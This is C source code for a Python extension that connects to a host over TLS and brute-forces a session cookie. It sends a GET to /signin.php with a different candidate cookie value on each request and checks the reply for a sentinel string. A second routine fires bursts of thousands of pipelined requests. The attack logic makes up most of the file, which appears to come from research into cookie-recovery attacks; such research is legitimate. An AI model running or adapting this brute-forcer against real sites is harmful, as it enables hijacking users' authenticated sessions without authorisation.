/**
 * Set python exceptions if something goes wrong
 */
#include <Python.h>
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netdb.h>
#include <arpa/inet.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#include "util.h"

/** Represents a TCP/SSL/HTTPS connection to a server */
typedef struct connection {
	char endpoint[512];
	char hostname[512];
	int sock;
	SSL_CTX *context;
	SSL *handle;
} connection_t;

#define COOKIE_LEN 16

// ================================== TCP / SSL Functions ========================================

int tcp_connect(const char *endpoint, const char *port)
{
	struct addrinfo hints;
	struct addrinfo *servinfo;  // will point to the results
	int status, sock;

	memset(&hints, 0, sizeof hints);
	hints.ai_family = AF_INET;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_flags = AI_PASSIVE;

	if ((status = getaddrinfo(endpoint, port, &hints, &servinfo)) != 0) {
		PyErr_Format(PyExc_IOError, "getaddrinfo error: %s\n", gai_strerror(status));
		return -1;
	}

	sock = socket(servinfo->ai_family, servinfo->ai_socktype, servinfo->ai_protocol);
	if (sock == -1) {
		PyErr_Format(PyExc_IOError, "socket() failed: %s", strerror(errno));
		return -1;
	}

	if (connect(sock, servinfo->ai_addr, servinfo->ai_addrlen) == -1) {
		PyErr_Format(PyExc_IOError, "connect() failed: %s", strerror(errno));
		return -1;
	}

	freeaddrinfo(servinfo);

	return sock;
}

int ssl_connect(const char *endpoint, const char *port, connection_t *conn)
{
	conn->sock = tcp_connect(endpoint, port);
	if (conn->sock == -1) return -1;

	// We are the client in this connection, use TLSv1.1
	conn->context = SSL_CTX_new(TLSv1_1_client_method());
	if (conn->context == NULL) {
		PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
		return -1;
	}

	// Create an SSL struct to hold data for the connection
	conn->handle = SSL_new(conn->context);
	if (conn->handle == NULL) {
		PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
		return -1;
	}

	// Associate the SSL connection to our TCP socket
	if (!SSL_set_fd(conn->handle, conn->sock)) {
		PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
		return -1;
	}

	// Finally initiate the SSL handshake over the TCP socket
	if (SSL_connect(conn->handle) != 1) {
		PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
		return -1;
	}

	return 0;
}

int ssl_read(connection_t *conn, void *buff, int length)
{
	int rval = SSL_read(conn->handle, buff, length);
	if (rval <= 0) PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
	return rval;
}

int ssl_write(connection_t *conn, void *buff, int length)
{
	int rval = SSL_write(conn->handle, buff, length);
	if (rval <= 0) PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
	return rval;
}

int ssl_writestr(connection_t *conn, char *string)
{
	int rval = ssl_write(conn, string, strlen(string));
	if (rval <= 0) PyErr_Format(PyExc_Exception, "TLS error: %s", ERR_error_string(ERR_get_error(), NULL));
	return rval;
}

int ssl_close(connection_t *conn)
{
	return -1; // TODO
}

// ================================== HTTP(S) Functions ========================================

int https_connect(const char *hostname, const char *port, connection_t *conn, const char *endpoint = NULL)
{
	strncpy(conn->hostname, hostname, sizeof(conn->hostname));
	conn->hostname[sizeof(conn->hostname) - 1] = '\0';

	if (endpoint) {
		strncpy(conn->endpoint, endpoint, sizeof(conn->endpoint));
	        conn->endpoint[sizeof(conn->endpoint) - 1] = '\0';
	} else {
		memcpy(conn->endpoint, conn->hostname, sizeof(conn->endpoint));
	}

	return ssl_connect(conn->endpoint, port, conn);
}

int https_request(connection_t *conn, const char *cookiename, const char *cookievalue)
{
	const char *httpformat =
		"GET /signin.php HTTP/1.1\r\n"
		"Host: %s\r\n"
		"Cookie: %s=%s\r\n"
		"Connection: keep-alive\r\n\r\n";
	char buffer[512];

	snprintf(buffer, sizeof(buffer), httpformat, conn->hostname, cookiename, cookievalue);
	return ssl_writestr(conn, buffer);
}


// ================================== Cookie Bruteforcing Test ========================================

PyObject * brute_simple(const char *hostname, const char *cookiename, const char candidates[][16], int numcandidates, const char *sentinel)
{
	uint8_t buffer[1024];

	// Initialize OpenSSL
	SSL_load_error_strings();
	SSL_library_init();

	// Connect to endpoint using SSL
	PySys_WriteStdout("Connecting to %s:443 ...\n", hostname);
	connection_t conn;
	int rval = https_connect(hostname, "443", &conn);
	if (rval < 0) return NULL;

	// Perform a slow quick and dirty tests
	for (int i = 0; i < numcandidates; ++i) {
		char cookievalue[17] = {0};
		memcpy(cookievalue, candidates[i], COOKIE_LEN);

		updatestatus("Testing cookie %s [%5d/%d]", cookievalue, i, numcandidates);
		if (https_request(&conn, cookiename, cookievalue) <= 0)
			return NULL;
		if (ssl_read(&conn, buffer, sizeof(buffer)) <= 0)
			return NULL;

		if (memcmp(buffer, "HTTP", 4) != 0) {
			PyErr_Format(PyExc_Exception, "Unexpected response from server");
			return NULL;
		}
		if (strstr((const char*)buffer, sentinel) != NULL) {
			PySys_WriteStdout("\nCookie found: %s\n", cookievalue);
			Py_RETURN_NONE;
		}
	}

	PySys_WriteStdout("\n");

	// Close connection and SSL
	ssl_close(&conn);

	Py_RETURN_NONE;
}


int brute_pipelined(const char *hostname)
{
	uint8_t buffer[1024];
	int numpipelined = 2000;
	int numbursts    = 50;

	// Initialize OpenSSL
	SSL_load_error_strings();
	SSL_library_init();

	// Connect to endpoint using SSL
	connection_t conn;
	int rval = https_connect(hostname, "443", &conn);
	if (rval < 0) return 1;

	// Perform a quick and dirty tests
	for (int j = 0; j < numbursts; ++j)
	{
		PySys_WriteStdout("Sending burst %d/%d\n", j, numbursts);

		for (int i = 0; i < numpipelined; ++i) {
			if (https_request(&conn, "auth", "testcookie") <= 0)
				return 1;
		}

		PySys_WriteStdout("Reading replies ...\n");

		for (int i = 0; i < numpipelined; ++i) {
			// FIXME: Create https_response to get the response? Seperate headers & content?
			if (ssl_read(&conn, buffer, sizeof(buffer)) <= 0)
				return 1;

			if (memcmp(buffer, "HTTP", 4) != 0) {
				fprintf(stderr, "Unexpected response\n");
				return 1;
			}
		}
	}

	// Close connection and SSL
	ssl_close(&conn);

	printf("Handled %d requests\n", numbursts * numpipelined);
	return 0;
}


PyObject * py_brutecookie(PyObject *self, PyObject *args)
{
	const char *hostname, *cookiename, *sentinel;
	PyObject *pyarg = NULL;
	PyArrayObject *pyarray = NULL;
	const char (*candidates)[][COOKIE_LEN];

	//if (brute_pipelined("a.site.com"))
	//	return NULL;


	// Get the arguments
	if (!PyArg_ParseTuple(args, "ssO!s", &hostname, &cookiename, &PyArray_Type, &pyarg, &sentinel))
		return NULL;
	PyArray_OutputConverter(pyarg, &pyarray);
	candidates = (char (*)[][COOKIE_LEN]) PyArray_DATA(pyarray);

	// Brute-force the candidate list
	return brute_simple(hostname, cookiename, *candidates, PyArray_DIM(pyarray, 0), sentinel);
}

